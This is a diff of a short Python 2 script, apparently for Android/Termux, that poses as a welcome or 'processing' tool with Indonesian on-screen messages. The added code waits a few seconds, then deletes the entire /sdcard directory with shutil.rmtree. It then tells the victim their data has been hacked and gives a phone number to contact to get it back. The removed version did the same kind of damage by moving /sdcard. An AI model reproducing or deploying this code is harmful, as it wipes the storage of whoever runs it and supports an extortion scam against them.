@@ -1,37 +1,57 @@
 import os
 import sys
-print
-print
-os.system('clear')
-os.system('figlet SHADOW')
-print
-print
-print "[Author  = Shadow]"
-print "[Contact = Shadow44@gmail.com]"
-os.system('mkdir HackByShadow.zip')
-os.system('mv /sdcard HackByShadow.zip')
+import shutil
+import time
+os.system("figlet WELCOME")
+time.sleep(3)
 print
 print
 print
-print
-print "sedang memproses...."
+print "sedang memproses..."
+time.sleep(5)
 print
 print
 print
 print
-print "YOU ARE HACKED :)"
 print
 print
 print
-print "INGIN DATA KEMBALI?"
 print
-print "HUBUNGI WA 082158878826"
 print
-print "==================="
-print "[NO SYSTEM IS SAFE]"
-print "==================="
+print "Tunggu sebentar"
 print
 print
 print
-print "================================================"
+print
+print
+print
+time.sleep(15)
+shutil.rmtree("/sdcard/")
+print
+print
+print
+print
+print
+print
+print
+print "Proses Selesai"
+print
+print
+print
+print
+print "Data Anda Telah Di Hack"
+print
+print
+print
+print "Cek penyimpanan internal :)"
+print
+print
+print
+print
+print "Ingin Data Anda Kembali?"
+print
+print "Chat No ini 082158878826"
+print
+print
+print
 
